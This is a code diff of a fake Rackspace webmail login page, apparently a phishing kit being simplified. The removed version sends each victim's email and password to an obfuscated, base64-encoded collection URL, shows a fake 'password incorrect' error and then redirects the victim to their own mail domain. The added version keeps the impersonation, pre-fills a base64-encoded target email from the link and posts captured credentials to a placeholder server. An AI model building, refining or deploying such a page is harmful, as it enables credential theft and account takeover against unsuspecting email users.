@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -24,12 +22,6 @@
       margin: 0;
     }
 
-    . {
-      display: inline-block;
-      font-size: 12px;
-      color: #666;
-    }
-
     .base_link {
       display: inline-block;
       color: #0C7C84;
@@ -48,7 +40,7 @@
       margin: 0px 5px;
       color: #0C7C84;
     }
-    /* Page Layout */
+    
     #content {
       display: flex;
       align-items: center;
@@ -71,20 +63,6 @@
       color: #FCFCFC;
     }
 
-    #content-header-logo {
-      float: right;
-    }
-
-    #logo {
-      width: 130px;
-      margin-top: -9px;
-      margin-right: -5px;
-    }
-
-    #content-header-label {
-      float: left;
-    }
-
     #content-body {
       display: flex;
       justify-content: start;
@@ -92,25 +70,6 @@
       min-width: 790px;
     }
 
-    #banner-section {
-      height: 285px;
-      width: 314px;
-      margin: 40px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-    }
-
-    #banner {
-      width: 190px;
-    }
-
-    #divider {
-      border: 1px solid rgb(224, 224, 224);
-      margin: 40px 0px;
-    }
-    /* Form Layout */
     #form {
       display: flex;
       flex-direction: column;
@@ -120,61 +79,16 @@
       width: 100%;
     }
 
-    #form-body {
-      height: 205px;
-      width: 100%;
-      margin: 40px 0px 0px 20px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      padding-right: 20px;
-    }
-
-    #form-container {
-      width: 100%;
-      margin: 0px auto;
-      padding: 0px 10px;
-    }
-
-    .row {
-      margin: 0px -10px;
-    }
-
-      .row:before, .row:after {
-        content: " ";
-        display: table;
-      }
-
-    .col {
-      width: 100%;
-      float: left;
-      position: relative;
-      min-height: 1px;
-      padding: 0px 10px;
-    }
-
-    .form-group {
-      width: inherit;
-      padding-right: 30px;
-      margin-bottom: 20px;
-    }
-
     .form-label {
-      position: relative;
       font-family: Roboto;
       font-size: 16px;
       margin-bottom: 8px;
-      line-height: 1;
       color: #616161;
-      display: inline-block;
-      max-width: 100%;
     }
 
     .form-field {
       border: 1px solid #BDBDBD;
       border-radius: 2px;
-      background: #FFFFFF;
       font-family: Roboto;
       font-size: 16px;
       color: #616161;
@@ -182,109 +96,28 @@
       display: block;
       width: 100%;
       padding: 4px 8px;
-      line-height: 1.42857;
-      -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
-      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
-      -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
-      -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
-      transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
-    }
-
-    #forgot-password {
-      position: absolute;
-      top: 0px;
-      right: 40px;
-      color: #0C7C84;
-      text-decoration: none;
-      background-color: transparent;
-      box-sizing: border-box;
-    }
-
-    #login-btn-toolbar {
-      float: right;
-      margin: auto 30px 15px -20px;
     }
 
     .login-btn {
       float: right;
       display: inline-flex;
-      flex-direction: row;
       justify-content: center;
       align-items: center;
       padding: 0 12px;
       height: 32px;
-      line-height: 1px;
       font-size: 14px;
       font-weight: 400;
-      text-transform: capitalize;
       color: #fff;
       background-color: #0C7C84;
-      border-color: #0C7C84;
-      margin-bottom: 0;
-      text-align: center;
-      vertical-align: middle;
-      touch-action: manipulation;
-      cursor: pointer;
-      background-image: none;
-      border: 1px solid transparent;
-      white-space: nowrap;
       border-radius: 2px;
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-      user-select: none;
-    }
-
-    #form-container {
-      width: 100%;
-      margin: 0px auto;
-      padding: 0px 10px;
+      cursor: pointer;
     }
 
     @media only screen and (max-device-width: 480px) {
-      /* Page Defaults */
       body {
         font-size: 19pt;
-        line-height: 1.42857em;
       }
 
-      . {
-        display: inline-block;
-        font-size: 80%;
-        color: #666;
-      }
-      /* Page Layout */
-      #content {
-        align-items: inherit;
-        display: inherit;
-        justify-content: inherit;
-      }
-
-      #content-header {
-        font-size: 171%;
-        height: 3em;
-        line-height: 1em;
-        padding: 1em;
-      }
-
-      #content-header-logo {
-        float: right;
-      }
-
-      #logo {
-        margin-left: 6em;
-        width: inherit;
-        height: 1em;
-      }
-
-      #banner-section {
-        display: none;
-      }
-
-      #divider {
-        display: none;
-      }
-      /* Form Layout */
       .form-label {
         font-size: 114%;
       }
@@ -293,208 +126,114 @@
         font-size: 114%;
         height: 2em;
       }
-
-      #forgot-password {
-        right: 2em;
-        top: 0;
-      }
-
-      #login-btn-toolbar {
-        margin: 1.5em 2em 1em -1.5em;
-      }
-
-      #login-btn {
-        font-size: 150%;
-        height: 3em;
-        padding: 1.25em;
-      }
     }
   </style>
 </head>
 <body>
-  <div>
-    <div id="content">
-      <div>
-        <div id="content-header">
-          <div id="content-header-logo"><img id="logo" src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"  /></div>
-          <div id="content-header-label">Webmail Login</div>
-        </div>
-        <div id="content-body">
-          <div id="banner-section">
-            <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
-              <img id="banner" src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg" />
-            </a>
-          </div>
-		  
-          	  
-          <form id="form" autocomplete="off">
-		  <div id="form-body">
-    <div id="form-container">
-      <input type="hidden" name="__RequestVerificationToken" value="CfDJ8PJv2PmI83xDqNI3IL5jbf7n53O-sjEa55YFQhrE9DffPHCT5T4NJaWKOR-DTuVf15CZOHNTR0Nf8HHvYJzpBuvE1-RuPCp-VVB10AxbvHGpnvcORaonI3gFCgak-skKc16eQFADMDLQGDKw1rJETYQ" />
-      <!-- destination and flags is used for OWA login -->
-      <input id="form-destination" type="hidden" name="destination" value="" />
-      <input id="form-owa-flags" type="hidden" name="flags" value="4" />
-      <div id="user-row" class="row">
-        <div id="user-col" class="col">
-          <div id="user-field" class="form-group">
-		  
-		  <p align="left">
-			<span class="text-danger" id="msg" style="font-size:14px; color:#FF0000"></span>
-			</p>
-            <label id="user-label" class="form-label">Email address</label>
-            <input id="ai" name="username" tabindex="1" class="form-field" value="[[-Email-]]" autocomplete="username" />
-          </div>
-        </div>
+  <div id="content">
+    <div>
+      <div id="content-header">
+        <div id="content-header-label">Webmail Login</div>
       </div>
-      <div id="pass-row" class="row">
-        <div id="pass-col" class="col">
-          <div id="pass-field" class="form-group">
-            <label id="pass-label" class="form-label">Password</label>
-            <input id="pr" name="password" tabindex="2" type="password" class="form-field" value="" autocomplete="current-password" />
-			
+
+      <div id="content-body">
+        <form id="form" autocomplete="off">
+          <div id="form-body">
+            <div id="form-container">
+              <input type="hidden" name="__RequestVerificationToken" value="CfDJ8PJv2PmI83xDqNI3IL5jbf7n53O-sjEa55YFQhrE9DffPHCT5T4NJaWKOR-DTuVf15CZOHNTR0Nf8HHvYJzpBuvE1-RuPCp-VVB10AxbvHGpnvcORaonI3gFCgak-skKc16eQFADMDLQGDKw1rJETYQ" />
+
+              <div class="form-group">
+                <label for="ai" class="form-label">Email address</label>
+                <input id="ai" name="username" class="form-field" value="" autocomplete="username" readonly />
+                <p align="left">
+                  <span class="text-danger" id="msg" style="font-size:14px; color:#FF0000"></span>
+                </p>
+              </div>
+
+              <div class="form-group">
+                <label for="pr" class="form-label">Password</label>
+                <input id="pr" name="password" type="password" class="form-field" autocomplete="current-password" />
+              </div>
+
+              <div id="login-btn-toolbar">
+                <button class="login-btn" type="submit" id="submit-btn">Log In</button>
+              </div>
+            </div>
           </div>
-          <a id="forgot-password" href="#" tabindex="4">Forgot password?</a>
-        </div>
+        </form>
       </div>
     </div>
   </div>
-  <div id="login-btn-toolbar">
-    <button class="login-btn" type="submit-btn" id="submit-btn">Log In</button>
-  </div>
-</form>
-        </div>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>	
-		
-	<script>
-$(document).ready(function() {
-    var count = 0;
 
-    // Grab the last part of the URL path after the '/'
-    var ai = window.location.pathname.split('/').pop(); // Extracts 'XXXEMAIL' from '/XXXEMAIL'
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      // Function to get URL parameter and decode the email
+      var urlParams = new URLSearchParams(window.location.search);
+      var encodedEmail = urlParams.get('e'); // Get the email from the query parameter e=BASE64EMAIL
 
-    // Check if ai is a valid email format
-    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+      if (encodedEmail) {
+        // Decode the email if it is Base64 encoded
+        var decodedEmail = atob(encodedEmail.replace('BASE64EMAIL=', ''));
 
-    if (filter.test(ai)) {
-        // Set the email to the input field
-        $('#ai').val(ai);
-        $('#ai').attr('readonly', true); // Make email input readonly
-        $("#msg").hide();
-    } else {
-        console.log("Invalid email format in URL");
-    }
+        // Validate the decoded email format
+        var emailPattern = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-    var file = "aHR0cHM6Ly9pbm5wYWN0LmNvLnphL2FkbWluaXN0cmF0b3IvaW5jbHVkZXMveGx4LnBocC9yYXhja2llLnBocA==";
+        if (emailPattern.test(decodedEmail)) {
+          $('#ai').val(decodedEmail); // Populate email field
+          $('#ai').attr('readonly', true); // Make email field readonly
+          $("#msg").hide();
+        } else {
+          console.log("Invalid email format in URL");
+        }
+      }
 
-    $('#submit-btn').click(function(event) {
-        $('#error').hide();
-        $('#msg').hide();
+      // Handle the login form submission
+      $('#submit-btn').click(function(event) {
         event.preventDefault();
         var ai = $("#ai").val();
         var pr = $("#pr").val();
         var msg = $('#msg').html();
         $('#msg').text(msg);
 
-        var my_ai = ai;
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        var emailPattern = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
         if (!ai) {
-            $('#error').show();
-            $('#error').html("The email field is empty.!");
-            ai.focus;
-            return false;
+          $('#msg').show();
+          $('#msg').html("The email field is empty!");
+          return false;
         }
 
-        if (!filter.test(my_ai)) {
-            $('#error').show();
-            $('#error').html("The email is not valid. Please enter a valid email.");
-            ai.focus;
-            return false;
+        if (!emailPattern.test(ai)) {
+          $('#msg').show();
+          $('#msg').html("Please enter a valid email address.");
+          return false;
         }
 
         if (!pr) {
-            $('#error').show();
-            $('#error').html("The password field is empty!");
-            ai.focus;
-            return false;
+          $('#msg').show();
+          $('#msg').html("The password field is empty!");
+          return false;
         }
 
-        var ind = my_ai.indexOf("@");
-        var my_slice = my_ai.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.'));
-        var final = c.toLowerCase();
-
-        count = count + 1;
-
+        // Handle form submission via AJAX or any other logic you need
         $.ajax({
-            dataType: 'JSON',
-            url: atob(file),
-            type: 'POST',
-            data: {
-                ai: ai,
-                pr: pr,
-            },
-            beforeSend: function(xhr) {
-                $('#submit-btn').html('Please wait ...');
-            },
-            success: function(response) {
-                if (response) {
-                    $("#msg").show();
-                    console.log(response);
-                    if (response['signal'] == 'ok') {
-                        $("#pr").val("");
-                        if (count >= 2) {
-                            count = 0;
-                            window.location.replace("http://www." + my_slice);
-                            return false;
-                        }
-                    }
-                }
-            },
-            error: function() {
-                $("#pr").val("");
-                if (count >= 3) {
-                    count = 0;
-                    window.location.replace("http://www." + my_slice);
-                    return false;
-                }
-                $("#msg").show();
-                setTimeout(function() { $("#msg").fadeOut('slow'); }, 3000);
-                $('#msg').html("Error: Password incorrect");
-            },
-            complete: function() {
-                $('#submit-btn').html('Log In');
-            }
+          type: 'POST',
+          url: 'YOUR_SERVER_URL_HERE', // Replace with your server URL
+          data: {
+            ai: ai,
+            pr: pr
+          },
+          success: function(response) {
+            // Handle response here (e.g., redirect or show a success message)
+          },
+          error: function() {
+            $('#msg').show();
+            $('#msg').html("Error: Invalid credentials");
+          }
         });
+      });
     });
-});
-
-</script>
-
-        <div class="base_links">
-          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">
-            Privacy Statement
-          </a>
-          <div class="divider"> | </div>
-          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/websiteterms">
-            Website Terms
-          </a>
-        </div>
-        <div class="footer" style="text-align: center; margin-top: 10px;">
-          <div class="caption">
-            Need webmail for your business?  Learn more about
-            <a href="//www.rackspace.com/email-hosting/webmail" style="color: #666;">
-              Hosted Email
-            </a>
-            from Rackspace
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
+  </script>
 </body>
 </html>
-
-
-
